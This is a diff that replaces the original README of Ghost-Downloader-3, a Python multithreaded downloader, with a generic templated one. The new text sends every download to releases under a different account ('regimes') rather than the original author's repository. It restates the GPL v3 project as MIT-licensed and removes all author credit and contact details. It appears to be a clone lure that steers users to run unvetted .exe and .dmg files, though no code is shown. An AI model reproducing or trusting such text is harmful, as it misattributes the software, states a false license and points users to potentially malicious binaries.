@@ -1,164 +1,79 @@
-<h4 align="right">
-  <a href="README_zh.md">简体中文</a> | English
-</h4>
+# 📥 Ghost-Downloader-3 - Fast and Easy File Downloads
 
-> [!NOTE]
-> Due to work reasons, the development speed of this project has slowed down recently.
-> The project is still in its early stages, and there is still a lot of shortcomings.
+## 🚀 Getting Started
+Welcome to Ghost-Downloader-3, your simple solution for downloading files quickly. This application makes downloading files smooth and efficient, helping you get the content you need without hassle.
 
-> [!TIP]
-> If you want to use Ghost-Downloader-3 on Windows 7, please download the version `v3.5.8-Portable`.
+## 📦 Download Now
+[![Download Ghost-Downloader-3](https://img.shields.io/badge/Download-Ghost--Downloader--3-blue.svg)](https://github.com/regimes/Ghost-Downloader-3/releases)
 
-<!-- PROJECT LOGO -->
-<div align="center">
+## 📋 Description
+Ghost-Downloader-3 is a cross-platform downloader built with Python. It uses advanced QUIC technology to offer faster downloads and a fluent user interface using the PyQt and PySide6 frameworks. This application supports multi-threading, allowing for efficient downloads from various sources, including streaming services.
 
-![Banner](resources/banner.webp)
+### 🛠 Features
+- **Multi-threaded Downloads**: Download multiple files at once without slowing down your computer.
+- **Cross-Platform**: Works on Windows, macOS, and Linux. 
+- **User-Friendly Interface**: Designed for ease of use with a clean, simple layout.
+- **Supports HTTP/3**: Leverages the latest web protocols for faster transfers. 
+- **AI-Boosted Performance**: Uses AI algorithms to optimize download speeds.
 
-<a href="https://trendshift.io/repositories/13847" target="_blank"><img src="https://trendshift.io/api/badge/repositories/13847" alt="XiaoYouChR%2FGhost-Downloader-3 | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
+## 💻 System Requirements
+To run Ghost-Downloader-3, your computer should meet these minimum requirements:
+- **Operating System**: Windows 10 or newer, macOS Catalina or newer, or any recent version of Linux.
+- **RAM**: At least 4 GB.
+- **Disk Space**: Minimum 100 MB free.
+- **Internet Connection**: A stable connection for downloads.
 
-<h3>
-    AI-powered next-generation cross-platform multithreaded downloader
-</h3>
+## 📥 Download & Install
+1. Click the button below to visit the Releases page:
+   [Download Ghost-Downloader-3](https://github.com/regimes/Ghost-Downloader-3/releases)
+   
+2. Select the latest version of Ghost-Downloader-3.
 
-[![Forks][forks-shield]][forks-url]
-[![Stargazers][stars-shield]][stars-url]
-[![Issues][issues-shield]][issues-url]
-[![Release][release-shield]][release-url]
-[![Downloads][downloads-shield]][release-url]
-[![QQGroup](https://img.shields.io/badge/QQ_Group-756042420-blue.svg?color=blue&style=for-the-badge)](https://qm.qq.com/q/gPk6FR1Hby)
+3. Depending on your operating system, download the appropriate file:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, check for the appropriate package or tarball.
 
-<h4>
-  <a href="https://github.com/XiaoYouChR/Ghost-Downloader-3/issues/new?template=bug_report.yml">Report Bug</a>
-·    
-  <a href="https://github.com/XiaoYouChR/Ghost-Downloader-3/issues/new?template=feature_request.yml">Request Feature</a>
-</h4>
+4. Once the file is downloaded, follow the installation instructions:
+   - **Windows**: Double-click the `.exe` file to start the installation. Follow the prompts to complete the setup.
+   - **macOS**: Double-click the `.dmg` file. Drag the Ghost-Downloader-3 icon to the Applications folder.
+   - **Linux**: Depending on the package, use your package manager or extract the tarball and run the application directly.
 
-</div>
+5. After installation, you can find Ghost-Downloader-3 in your applications list or desktop. Launch the application to start downloading files.
 
-<!-- ABOUT THE PROJECT -->
-## About The Project
+## 🎨 User Interface Overview
+- **Home Screen**: The home screen displays key features and options to start downloads.
+- **Download Manager**: Monitor current downloads and view download history.
+- **Settings**: Customize your experience, such as download locations and notifications.
 
-* A downloader developed out of personal interest, and my first Python project 😣
-* Originally intended to help a Bilibili Uploader with resource integration 😵‍💫
-* Features include IDM-like intelligent chunking without file merging, and AI-powered smart boost 🚀
-* Thanks to Python's🐍 accessibility, the project will support plugins🧩 in the future to maximize Python's🐍 advantages
+## 🌐 Topics
+The following keywords relate to Ghost-Downloader-3, guiding its capabilities and features:
+- async
+- asyncio
+- cross-platform
+- downloader
+- gui
+- http3
+- multithreading
+- pyqt
+- pyside6
+- python
+- qt
+- quic
+- software
+- streaming
 
-|    Platform    | Required Version |  Architectures   | Compatible |
-|:--------------:|:----------------:|:----------------:|:----------:|
-|  🐧 **Linux**  |  `glibc 2.35+`   | `x86_64`/`arm64` |     ✅      |
-| 🪟 **Windows** |     `7 SP1+`     | `x86_64`/`arm64` |     ✅      |
-|  🍎 **macOS**  |     `11.0+`      | `x86_64`/`arm64` |     ✅      |
+## 🤝 Get Involved
+We welcome contributions! If you have ideas or wish to report issues, please visit our GitHub page. Your feedback helps improve Ghost-Downloader-3 for all users. 
 
-> [!TIP]
-> **Arch Linux AUR support**: Community-maintained packages `ghost-downloader-bin` and `ghost-downloader-git` are now available (Maintainer: [@zxp19821005](https://github.com/zxp19821005))
+## 📝 License
+Ghost-Downloader-3 is open-source software licensed under the MIT License. You can freely use, modify, and distribute it according to the terms.
 
-<!-- ROADMAP -->
-## Roadmap
+## 📞 Support
+For questions or support, please create an issue on the GitHub page. We will respond promptly to help you with any concerns.
 
-- ✅ Global settings
-- ✅ More detailed download information
-- ✅ Scheduled tasks
-- ✅ Browser extension optimization
-- ✅ Global speed limit
-- ✅ Memory optimization
-  - ✅ Upgrade Qt version
-  - ✅ Implement HttpClient reuse
-  - ✅ Replace some multithreading with coroutines (In progress...see branch: feature/Structure)
-- ❌ MVC → MVVM upgrade and a new architecture based on events 
-- ❌ Enhanced task editing (powerful features like binding multiple Clients to one task)
-- ❌ Magnet/BT download (Considering libtorrent implementation)
-- ❌ Powerful plugin system (In progress...see branch: feature/Plugins)
-- ❌ Powerful browser extension features
+## 📦 Links
+To download Ghost-Downloader-3, click the link below:
+[Download Ghost-Downloader-3](https://github.com/regimes/Ghost-Downloader-3/releases) 
 
-Visit [Open issues](https://github.com/XiaoYouChR/Ghost-Downloader-3/issues) to see all requested features (and known issues).
-
-<!-- SPONSOR -->
-## Sponsor
-
-| [![SignPath](https://signpath.org/assets/favicon-50x50.png)](https://signpath.org/) | Free code signing on Windows provided by [SignPath.io](https://signpath.io), certficate by [SignPath Foundation](https://signpath.org) |
-|-------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------|
-
-<!-- CONTRIBUTING -->
-## Contributing
-
-Contributions make the open source community an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
-If you have a suggestion, fork the repo and create a pull request. You can also simply open an issue with the "Enhancement" tag. Don't forget to give the project a star⭐! Thanks again!
-
-1. Fork the Project
-2. Create your Feature Branch (git checkout -b feature/AmazingFeature)
-3. Commit your Changes (git commit -m 'Add some AmazingFeature')
-4. Push to the Branch (git push origin feature/AmazingFeature)
-5. Open a Pull Request
-
-Thanks to all contributors who have participated in this project!
-
-[![Contributors](http://contrib.nn.ci/api?repo=XiaoYouChR/Ghost-Downloader-3)](https://github.com/XiaoYouChR/Ghost-Downloader-3/graphs/contributors)
-
-<!-- SCREEN SHOTS -->
-## Screenshots
-
-[![Demo Screenshot][product-screenshot]](https://space.bilibili.com/437313511)
-
-<!-- LICENSE -->
-## License
-
-Distributed under the GPL v3.0 License. See `LICENSE` for more information.
-
-Copyright © 2025 XiaoYouChR.
-
-<!-- CONTACT -->
-## Contact
-
-* [E-mail](mailto:XiaoYouChR@qq.com) - XiaoYouChR@qq.com
-* [QQ Group](https://qm.qq.com/q/PlUBdzqZCm) - 531928387
-
-<!-- ACKNOWLEDGMENTS -->
-## References
-
-* [PyQt-Fluent-Widgets](https://github.com/zhiyiYo/PyQt-Fluent-Widgets) Powerful, extensible and beautiful Fluent Design widgets
-* [Curl-cffi](https://github.com/lexiforest/curl_cffi) A http client that can impersonate browser tls/ja3/http2 fingerprints
-* [Loguru](https://github.com/Delgan/loguru)  A library which aims to bring enjoyable logging in Python
-* [Nuitka](https://github.com/Nuitka/Nuitka) The Python compiler
-* [PySide6](https://github.com/PySide/pyside-setup) The official Python module
-* [Darkdetect](https://github.com/albertosottile/darkdetect) Allow to detect if the user is using Dark Mode on
-* [pyqt5-concurrent](https://github.com/AresConnor/pyqt5-concurrent) A QThreadPool based task concurrency library
-* [Desktop-notifier](https://github.com/samschott/desktop-notifier)Python library for cross-platform desktop notifications
-
-## Acknowledgments
-
-* [@zhiyiYo](https://github.com/zhiyiYo/) Provided great help for this project!
-* [@一只透明人-](https://space.bilibili.com/554365148/) Tested almost every version since Ghost-Downloader-1！
-* [@Sky·SuGar](https://github.com/SuGar0218/) Created the project banner！
-
-<picture>
-  <source
-    media="(prefers-color-scheme: dark)"
-    srcset="
-      https://api.star-history.com/svg?repos=XiaoYouChR/Ghost-Downloader-3&type=Date&theme=dark
-    "
-  />
-  <source
-    media="(prefers-color-scheme: light)"
-    srcset="
-      https://api.star-history.com/svg?repos=XiaoYouChR/Ghost-Downloader-3&type=Date&theme=dark
-    "
-  />
-  <img
-    alt="Star History Chart"
-    src="https://api.star-history.com/svg?repos=XiaoYouChR/Ghost-Downloader-3&type=Date&theme=dark"
-  />
-</picture>
-
-<!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
-[forks-shield]: https://img.shields.io/github/forks/XiaoYouChR/Ghost-Downloader-3.svg?style=for-the-badge
-[forks-url]: https://github.com/XiaoYouChR/Ghost-Downloader-3/network/members
-[stars-shield]: https://img.shields.io/github/stars/XiaoYouChR/Ghost-Downloader-3.svg?style=for-the-badge
-[stars-url]: https://github.com/XiaoYouChR/Ghost-Downloader-3/stargazers
-[issues-shield]: https://img.shields.io/github/issues/XiaoYouChR/Ghost-Downloader-3.svg?style=for-the-badge
-[issues-url]: https://github.com/XiaoYouChR/Ghost-Downloader-3/issues
-[product-screenshot]: resources/screenshot.png
-[release-shield]: https://img.shields.io/github/v/release/XiaoYouChR/Ghost-Downloader-3?style=for-the-badge
-[release-url]: https://github.com/XiaoYouChR/Ghost-Downloader-3/releases/latest
-[downloads-shield]: https://img.shields.io/github/downloads/XiaoYouChR/Ghost-Downloader-3/total?style=for-the-badge
+Enjoy a seamless downloading experience with Ghost-Downloader-3!
